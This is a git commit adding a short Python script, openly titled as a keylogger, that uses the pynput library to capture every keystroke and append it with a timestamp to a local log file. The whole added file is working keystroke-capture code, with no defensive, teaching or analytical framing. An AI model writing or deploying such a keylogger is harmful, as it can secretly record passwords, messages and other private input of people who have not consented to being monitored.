c735a72b734ab51bc0bbf02f0d352dae4c5c312d
Intizar Khilji <inkhilji@gmail.com>
2020-08-16 10:47:44 +0530

    1

---
+++ keylogger.py
@@ -0,0 +1,32 @@
+# Keylogger using python
+# install pynput module
+from pynput.keyboard import Listener,Key
+import sys
+import datetime
+
+with open('log.txt','a') as f:
+    f.write(str(datetime.datetime.now())+'\n')
+
+def on_press(key):
+    if key == Key.esc:
+        sys.exit()
+    letter = str(key).replace("'",'')
+    write_on_file(letter)
+
+def write_on_file(letter):
+    key_list = ['Key.enter','Key.space', 'Key.backspace']
+    with open('log.txt','a') as f:
+        if letter in key_list:
+            if letter == 'Key.enter':
+                letter = '<RETURN>\n'
+            if letter == 'Key.space':
+                letter =' '
+            if letter == 'Key.backspace':
+                letter = ' <- '
+        else:
+            if letter.startswith('Key.') or letter.startswith('\\'):
+                letter = ''
+        f.write(letter)
+
+with Listener(on_press = on_press) as listener:
+    listener.join()
